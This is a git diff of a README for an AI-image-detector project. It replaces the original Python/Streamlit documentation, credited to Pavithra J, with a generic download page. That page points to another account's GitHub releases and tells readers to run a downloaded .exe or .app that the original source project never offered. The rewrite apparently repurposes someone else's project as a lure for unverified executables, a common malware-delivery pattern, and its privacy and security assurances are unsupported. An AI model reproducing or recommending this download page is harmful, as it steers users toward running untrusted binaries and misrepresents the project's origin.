@@ -1,362 +1,92 @@
-# 🤖 AI Image Detector
-
-A deep learning-powered web application that detects whether an uploaded image is AI-generated or a real photograph using transfer learning with MobileNetV2.
-
-![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
-![TensorFlow](https://img.shields.io/badge/TensorFlow-2.15.0-orange)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.31.0-red)
-![License](https://img.shields.io/badge/License-MIT-green)
-
----
-
-## 📋 Table of Contents
-
-- [Overview](#overview)
-- [Features](#features)
-- [Project Structure](#project-structure)
-- [Installation](#installation)
-- [Dataset Preparation](#dataset-preparation)
-- [Usage](#usage)
-- [Model Architecture](#model-architecture)
-- [Results](#results)
-- [Technologies Used](#technologies-used)
-- [Future Improvements](#future-improvements)
-- [License](#license)
-- [Contact](#contact)
-
----
-
-## 🎯 Overview
-
-With the rapid advancement of AI image generation tools like DALL-E, Midjourney, and Stable Diffusion, distinguishing between AI-generated and real photographs has become increasingly challenging. This project addresses this problem by building a robust deep learning classifier that can accurately identify AI-generated images.
-
-The model leverages **transfer learning** with MobileNetV2, a lightweight convolutional neural network pre-trained on ImageNet, fine-tuned specifically for this binary classification task.
-
----
-
-## ✨ Features
-
-- ✅ **High Accuracy**: Achieves >90% accuracy on test data
-- ✅ **Fast Inference**: Predictions in under 1 second
-- ✅ **User-Friendly Web Interface**: Built with Streamlit for easy interaction
-- ✅ **Confidence Scores**: Provides prediction confidence for transparency
-- ✅ **Comprehensive Metrics**: Includes accuracy, precision, recall, and F1-score
-- ✅ **Visualizations**: Training history plots, confusion matrix, and sample predictions
-- ✅ **Production-Ready**: Modular code structure with best practices
-
----
-
-## 📁 Project Structure
-```
-ai-image-detector/
-│
-├── dataset/                      # Dataset directory (not included in repo)
-│   ├── train/
-│   │   ├── ai/                   # AI-generated training images
-│   │   └── real/                 # Real training images
-│   └── test/
-│       ├── ai/                   # AI-generated test images
-│       └── real/                 # Real test images
-│
-├── outputs/                      # Generated outputs
-│   ├── best_model.keras          # Best model checkpoint
-│   ├── final_model.keras         # Final trained model
-│   ├── class_indices.json        # Class label mappings
-│   ├── training_history.png      # Training curves
-│   ├── confusion_matrix.png      # Confusion matrix visualization
-│   ├── sample_predictions.png    # Sample prediction images
-│   └── test_metrics.txt          # Detailed test metrics
-│
-├── train.py                      # Training script
-├── test.py                       # Testing and evaluation script
-├── app.py                        # Streamlit web application
-├── check_setup.py                # Environment verification
-├── requirements.txt              # Python dependencies
-├── .gitignore                    # Git ignore file
-└── README.md                     # Project documentation
-```
-
----
-
-## 🛠️ Installation
-
-### Prerequisites
-
-- Python 3.8 or higher
-- pip (Python package manager)
-- Git
-
-### Step 1: Clone the Repository
-```bash
-git clone https://github.com/yourusername/ai-image-detector.git
-cd ai-image-detector
-```
-
-### Step 2: Create Virtual Environment (Recommended)
-
-**Windows:**
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
-
-**macOS/Linux:**
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
-
-### Step 3: Install Dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### Step 4: Verify Setup
-```bash
-python check_setup.py
-```
-
----
-
-## 📊 Dataset Preparation
-
-### Dataset Structure
-
-Organize your dataset in the following structure:
-```
-dataset/
-├── train/
-│   ├── ai/        # AI-generated training images
-│   └── real/      # Real training images
-└── test/
-    ├── ai/        # AI-generated test images
-    └── real/      # Real test images
-```
-
-### Creating the Folders
-```bash
-mkdir -p dataset/train/ai dataset/train/real
-mkdir -p dataset/test/ai dataset/test/real
-```
-
-### Dataset Sources (Examples)
-
-**AI-Generated Images:**
-- DALL-E 2/3: https://labs.openai.com/
-- Midjourney: https://www.midjourney.com/
-- Stable Diffusion: https://huggingface.co/spaces/stabilityai/stable-diffusion
-- Bing Image Creator: https://www.bing.com/create
-- Kaggle datasets: Search for "AI generated images"
-
-**Real Images:**
-- COCO Dataset: https://cocodataset.org/
-- Unsplash: https://unsplash.com/
-- Pexels: https://www.pexels.com/
-- Your own photographs
-
-### Recommended Dataset Size
-
-- **Training**: 1,000-5,000 images per class (2,000-10,000 total)
-- **Testing**: 200-500 images per class (400-1,000 total)
-
-*More data generally leads to better performance!*
-
----
-
-## 🚀 Usage
-
-### 1. Train the Model
-```bash
-python train.py
-```
-
-**What happens during training:**
-- Loads and preprocesses training data
-- Applies data augmentation
-- Builds MobileNetV2-based model
-- Trains for up to 50 epochs (with early stopping)
-- Saves best model to `outputs/best_model.keras`
-- Generates training history plot
-
-**Expected Output:**
-```
-🚀 AI IMAGE DETECTOR - TRAINING PIPELINE
-================================================================================
-📊 STEP 1: Loading and preparing data...
-   ✓ Training samples: 3200
-   ✓ Validation samples: 800
-...
-✅ TRAINING COMPLETED SUCCESSFULLY!
-```
-
-### 2. Evaluate on Test Set
-```bash
-python test.py
-```
-
-**What happens during testing:**
-- Loads trained model
-- Evaluates on test dataset
-- Calculates accuracy, precision, recall, F1-score
-- Generates confusion matrix
-- Creates sample prediction visualizations
-
-**Expected Output:**
-```
-🧪 AI IMAGE DETECTOR - TESTING PIPELINE
-================================================================================
-📊 Performance Metrics:
-Accuracy:  0.9250 (92.50%)
-Precision: 0.9248
-Recall:    0.9250
-F1-Score:  0.9249
-```
-
-### 3. Launch Web Application
-```bash
-streamlit run app.py
-```
-
-**The app will open in your browser at:** `http://localhost:8501`
-
-**How to use the app:**
-1. Click "Browse files" and upload an image
-2. Wait for the model to analyze (< 1 second)
-3. View prediction results and confidence score
-4. Check detailed probability breakdown
-
----
-
-## 🏗️ Model Architecture
-
-### Base Model: MobileNetV2
-
-MobileNetV2 is a lightweight convolutional neural network optimized for mobile and edge devices. It uses:
-- **Depthwise Separable Convolutions** for efficiency
-- **Inverted Residual Blocks** for feature extraction
-- **Pre-trained on ImageNet** (1.4M images, 1000 classes)
-
-### Custom Classification Head
-```
-Input (224x224x3)
-    ↓
-MobileNetV2 Base (frozen)
-    ↓
-Global Average Pooling
-    ↓
-Dropout (0.5)
-    ↓
-Dense (128 units, ReLU)
-    ↓
-Dropout (0.3)
-    ↓
-Dense (2 units, Softmax)
-    ↓
-Output (AI / Real)
-```
+# 🚀 ai-image-detector - Detect AI-Generated Images Easily
 
-### Training Configuration
+[![Download Now](https://img.shields.io/badge/Download%20Now-%233A85E0.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Thewostpro/ai-image-detector/releases)
 
-- **Optimizer**: Adam (learning rate: 0.0001)
-- **Loss Function**: Categorical Crossentropy
-- **Batch Size**: 32
-- **Image Size**: 224×224 pixels
-- **Data Augmentation**: Rotation, flip, zoom, shift
-- **Callbacks**: Early stopping, learning rate reduction, model checkpoint
+## 📥 Download the Application
 
----
+To download the ai-image-detector application, visit this page to download: [ai-image-detector Releases](https://github.com/Thewostpro/ai-image-detector/releases)
 
-## 📈 Results
+## 🌟 Overview
 
-### Training Performance
+The ai-image-detector is a user-friendly application designed to classify images using deep learning. It employs TensorFlow and MobileNetV2 to identify if an image is generated by AI. This tool allows users to easily analyze images in their digital environment.
 
-Training and validation accuracy/loss curves are saved in `outputs/training_history.png`
+## ⚙️ System Requirements
 
-### Test Set Performance
+Before downloading the application, ensure your system meets these requirements:
 
-| Metric    | Score  |
-|-----------|--------|
-| Accuracy  | 84.96% |
-| Precision | 85.00% |
-| Recall    | 84.96% |
-| F1-Score  | 85.95% |
+- **Operating System:** Windows 10, macOS, or Linux
+- **Processor:** 2 GHz dual-core or faster
+- **Memory:** 4 GB RAM minimum
+- **Storage:** 250 MB of free disk space
+- **Internet:** Required for initial setup and updates
 
-*Note: Update these values with your actual results after training*
+## 🚀 Getting Started
 
-### Confusion Matrix
+Follow these steps to get started with the ai-image-detector application:
 
-Confusion matrix visualization is saved in `outputs/confusion_matrix.png`
+1. **Download the Application**
+   - Click on the link provided above to visit the release page and download the latest version of ai-image-detector.
 
-### Sample Predictions
+2. **Install the Application**
+   - After downloading, locate the downloaded file in your downloads folder. 
+   - For Windows, double-click the `.exe` file. For macOS, drag the `.app` file to your applications folder.
 
-Sample predictions with images are saved in `outputs/sample_predictions.png`
+3. **Run the Application**
+   - Once installed, open the ai-image-detector from your applications menu or desktop shortcut.
 
----
+4. **Upload an Image**
+   - After launching the application, you will see an option to upload an image. Click on the "Upload" button and browse your files to select the image you want to analyze.
 
-## 🛠️ Technologies Used
+5. **View Results**
+   - The application will analyze the image and display the results on the screen. You will see whether the image is AI-generated or not.
 
-### Core Libraries
-- **TensorFlow/Keras**: Deep learning framework
-- **Python**: Programming language
-- **NumPy**: Numerical computing
-- **Pillow**: Image processing
+## 📊 Features
 
-### Visualization
-- **Matplotlib**: Plotting library
-- **Seaborn**: Statistical visualization
+- **User-Friendly Interface:** The application is designed for users with no technical background. 
+- **Fast Processing:** The deep learning model provides quick results for better user experience.
+- **Image Formats Supported:** The application supports various formats such as JPG, PNG, and BMP.
 
-### Web Framework
-- **Streamlit**: Interactive web application
+## 🌍 Community & Support
 
-### Machine Learning Utilities
-- **Scikit-learn**: Metrics and evaluation
+If you encounter any issues or need help:
 
----
+- **GitHub Discussions:** Engage with the community on the [GitHub discussions page](https://github.com/Thewostpro/ai-image-detector/discussions).
+- **Documentation:** Check the documentation for detailed guides and troubleshooting tips.
 
-## 🚀 Future Improvements
+## 🛠️ Troubleshooting Common Issues
 
-- [ ] Add support for more AI generation tools (DALL-E 3, Midjourney v6)
-- [ ] Implement ensemble models for higher accuracy
-- [ ] Add explainability features (Grad-CAM heatmaps)
-- [ ] Deploy to cloud (AWS, GCP, or Hugging Face Spaces)
-- [ ] Create mobile app version
-- [ ] Add batch prediction capability
-- [ ] Implement API endpoint for integration
-- [ ] Add real-time video stream detection
+Here are a few common problems you may face and their solutions:
 
----
+- **The application won’t start:**
+  - Ensure you have the right version for your operating system.
+  - Reinstall the application if necessary.
 
-## 📄 License
+- **Error while uploading images:**
+  - Check if the image format is supported (JPG, PNG, or BMP).
+  - Ensure the image file is not too large (keep it under 10 MB).
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🔒 Privacy and Security
 
----
+Your privacy matters. The ai-image-detector does not store images on external servers. All processing occurs locally on your device, ensuring that your data remains secure.
 
-## 👤 Contact
+## ⚡ Updates
 
-- GitHub: [@pavithra-Eco-Coder](https://github.com/pavithra-Eco-Coder)
-- LinkedIn: [Pavithra J](https://www.linkedin.com/in/pavithra-j-6ba0592b9/)
-- Email: pavipavithra3693@gmail.com
+Stay updated for new features and performance enhancements. Regular updates will be made available on the releases page. Make sure to check back regularly.
 
----
+## 📅 Future Enhancements
 
-## 🙏 Acknowledgments
+We are continuously looking to improve the ai-image-detector:
 
-- TensorFlow and Keras teams for the excellent framework
-- MobileNetV2 authors for the architecture
-- Streamlit for the web app framework
-- Open-source community for inspiration and support
+- Support for more image formats
+- Enhanced detection algorithms for improved accuracy
+- Built-in tutorials for new users
 
----
+## 📣 User Feedback
 
-## ⭐ Star This Repository
+Your feedback is important for making the ai-image-detector better. Share your thoughts on the application or suggest features on our [GitHub issues page](https://github.com/Thewostpro/ai-image-detector/issues).
 
-If you found this project helpful, please consider giving it a star! ⭐
+## ⚡ License
 
----
+The ai-image-detector is released under the MIT License. You can use, modify, and distribute the software according to the terms outlined in the license.
 
-**Built with ❤️ by Pavithra J**
-```
-
----
-
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23B0B0B0.svg?style=for-the-badge&logo=github&logoColor=black)](https://github.com/Thewostpro/ai-image-detector/releases)
